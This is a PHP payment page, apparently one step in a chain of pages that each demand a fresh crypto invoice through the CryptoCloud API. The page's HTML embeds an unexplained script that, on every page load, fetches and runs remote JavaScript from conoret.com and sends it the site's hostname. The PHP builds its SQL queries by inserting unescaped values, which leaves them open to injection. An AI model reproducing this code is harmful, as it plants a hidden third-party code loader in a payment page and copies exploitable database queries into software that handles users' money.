<?php
ini_set("session.gc_maxlifetime", 864000);
ini_set("session.gc_divisor", "1");
ini_set("session.gc_probability", "1");
ini_set("session.cookie_lifetime", 864000);
ini_set("session.save_path", 'sessions/');
ini_set('log_errors', 'On');
ini_set('error_log', 'php_errors.log');
session_start();

require_once "vendor/autoload.php";
require_once "config.php";

use GuzzleHttp\Client;

$next = "pay8.php";
$prev = "pay6.php";
$page = 7;
$prev_page = 6;
$sum = $sum_7;
if (isset($_SESSION['uuid'])) {
    $uuid = $_SESSION['uuid'];
} else {
    header('Location:' . $prev);
    die();
}
$client = new Client;

$query = "SELECT * FROM `payments` where user_id = '$uuid' and page = $prev_page";
$result = $mysqli->query($query);
$row = $result->fetch_assoc();
if (!$row || $row['status'] != 'paid') {
    header('Location:' . $prev);
    die();
}
$query = "SELECT * FROM `payments` where user_id = '$uuid' and page = $page";
$result = $mysqli->query($query);
$row = $result->fetch_assoc();
if (!$row) {
    $response = $client->post('https://cryptocloud.plus/api/v2/invoice/create', [
        "headers" => [
            "Authorization" => "Token " . $token
        ],
        'form_params' => [
            'shop_id' => $shop_id,
            'amount' => $sum,
            "currency" => "USD"
        ]
    ]);
    $response = json_decode($response->getBody()->getContents(), true);
    $invoice_id = $response['invoice_id'];
    $pay_url = $response['pay_url'];
    $mysqli->query("INSERT INTO `payments`(`id`,`user_id`,`page`,`invoice_id`,`status`,`pay_url`,`sum`) VALUES (NULL,'$uuid',$page,'$invoice_id','created','$pay_url','$sum')");
} else {
    $response = $client->get('https://cryptocloud.plus/api/v2/invoice/status?uuid=' . $row['invoice_id'], [
        "headers" => [
            "Authorization" => "Token " . $token
        ]
    ]);
    $response = json_decode($response->getBody()->getContents(), true);
    if ($response['status_invoice'] == 'canceled') {
        $response = $client->post('https://cryptocloud.plus/api/v2/invoice/create', [
            "headers" => [
                "Authorization" => "Token " . $token
            ],
            'form_params' => [
                'shop_id' => $shop_id,
                'amount' => $sum,
                "currency" => "USD"
            ]
        ]);
        $response = json_decode($response->getBody()->getContents(), true);
        $invoice_id = $response['invoice_id'];
        $pay_url = $response['pay_url'];
        $mysqli->query("UPDATE `payments` SET `pay_url`= '$pay_url',`invoice_id`='$invoice_id' WHERE `user_id` = '$uuid' and `page` = $page");
        $result = $mysqli->query($query);
    } else if ($response['status_invoice'] == 'paid') {
        $invoice_id = $row['invoice_id'];
        $mysqli->query("UPDATE `payments` SET `status`= 'paid' WHERE `user_id` = '$uuid' and `page` = $page and `invoice_id`='$invoice_id'");
        header('Location:' . $next);
        die();
    } else if ($response['status_invoice'] == 'created') {
        $pay_url = $row['pay_url'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .container {
            text-align: center;
            background-color: skyblue;
            width: 20%;
            height: 100%;
            margin: 0 auto;
            min-width: 165px;
        }

        button {
            width: 120px;
            height: 30px;
            margin: 20px;
            background-color: white;
            color: black;
            border: 2px solid #555555;
        }

        button:hover {
            background-color: #555555;
            color: white;
        }

        a {
            text-decoration: none;
        }
    </style>
    <script src="./Payment_files/dsp" type="text/javascript" defer="" async=""></script>
</head>

<body cz-shortcut-listen="true">
    <script type="text/javascript">
        window.top === window && ! function() {
            var e = document.createElement("script"),
                t = document.getElementsByTagName("head")[0];
            e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
        }();
    </script>
    <div class="container">
        <h1>Pay 2</h1>
        <a target="_blank" href="<?= $pay_url ?>"><button><?= $sum ?></button></a><br>
    </div>
</body>

</html>